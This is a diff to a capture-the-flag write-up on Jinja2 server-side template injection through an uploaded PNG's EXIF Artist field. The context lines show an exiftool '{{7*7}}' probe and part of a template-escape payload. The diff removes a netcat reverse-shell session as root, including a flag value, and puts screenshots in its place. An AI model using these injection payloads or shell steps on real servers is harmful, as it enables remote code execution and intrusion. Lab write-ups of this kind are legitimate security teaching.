@@ -200,6 +200,8 @@ code=§1234§
 1. **Logo Upload** - Upload new site logo (PNG files only)
 2. **User Permissions** - Upgrade any user's role to admin
 
+![Admin Panel](../images/admin_panel.png) 
+
 **Logo Preview Endpoint:**
 
 ```
@@ -221,6 +223,8 @@ convert -size 1x1 xc:white /tmp/test.png
 exiftool -Artist='{{7*7}}' /tmp/test.png
 ```
 {% endraw %}
+![SSTI Confirmed](../images/ssti_confirmed.png)
+
 **Result:** Uploaded image, accessed preview - **"49" appeared** in the Artist field.
 
 ✅ **SSTI Confirmed** - Jinja2 template injection via EXIF Artist field.
@@ -247,34 +251,9 @@ exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals_
 
 ### Step 6: Flag Capture
 
-```bash
-──(kali㉿kali)-[~/]
-└─$ nc -nvlp 4444
-Listening on 0.0.0.0 4444
-Connection received on 10.1.148.204 35700
-bash: cannot set terminal process group (610): Inappropriate ioctl for device
-bash: no job control in this shell
-root@ip-10-1-148-204:/home/ubuntu# ll /root
-ll /root
-total 40
-drwx------  5 root root 4096 Jan 20 19:25 ./
-drwxr-xr-x 22 root root 4096 Jan 23 23:54 ../
--rw-------  1 root root  145 Jan 24 00:44 .bash_history
--rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
--rw-------  1 root root   20 Jan 11 03:19 .lesshst
-drwxr-xr-x  3 root root 4096 Jan 20 19:25 .local/
--rw-r--r--  1 root root  161 Apr 22  2024 .profile
-drwx------  2 root root 4096 Jan 10 17:49 .ssh/
--rw-r--r--  1 root root   18 Jan 20 19:25 root.txt
-drwx------  3 root root 4096 Jan 10 17:49 snap/
-```
+![Root Shell](../images/rce_access.png) 
 
-```bash
-root@ip-10-1-148-204:/home/ubuntu# cat /root/root.txt
-cat /root/root.txt
-HSM{a3fec2e83dad}
-```
-
+![Flag](../images/flag.png)
 
 > **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.
 
